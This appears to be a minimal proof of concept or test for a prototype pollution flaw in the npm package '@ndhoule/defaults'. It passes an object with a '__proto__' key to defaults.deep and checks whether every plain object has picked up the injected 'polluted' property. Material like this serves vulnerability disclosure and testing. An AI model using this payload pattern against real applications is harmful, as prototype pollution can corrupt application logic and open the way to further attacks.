const defaults = require('@ndhoule/defaults');

let payload = { ["__proto__"]: { "polluted": "yes" } };

defaults.deep({}, payload);

if (({}).polluted == "yes")
  throw Error("I pollute");
